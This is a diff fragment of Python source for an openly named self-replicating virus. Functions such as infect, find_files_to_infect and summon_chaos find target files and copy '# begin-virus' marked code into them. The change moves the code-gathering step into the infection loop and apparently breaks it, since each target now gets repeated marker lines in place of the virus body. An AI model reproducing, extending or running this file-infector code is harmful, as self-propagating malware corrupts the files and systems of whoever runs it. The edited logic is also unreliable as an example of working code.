@@ -40,19 +40,19 @@ def infect(file, virus_code):
 # Get the virus_code
 
 
-def get_virus_code():
+def get_virus_code(file):
     is_infected = False
     virus_code = []
-    code = get_content_of_file(__file__)
+    code = get_content_of_file(file)
 
-    # Check if it infected or not by using "begin-virus" and "end-virus"
+    # Check if it infected or not by using "begin-virus"
     for line in code:
         if "# begin-virus\n" in line:
             is_infected = True
             break
 
         if not is_infected:
-            virus_code.append(line)
+            virus_code.append("# begin-virus\n")
 
     return virus_code
 
@@ -64,11 +64,12 @@ def summon_chaos():
 
 
 try:
-    # Get the virus code
-    virus_code = get_virus_code()
 
     # Find target to infect
     for file in find_files_to_infect():
+
+        # Get the virus code
+        virus_code = get_virus_code(file)
         infect(file, virus_code)
 
     summon_chaos()
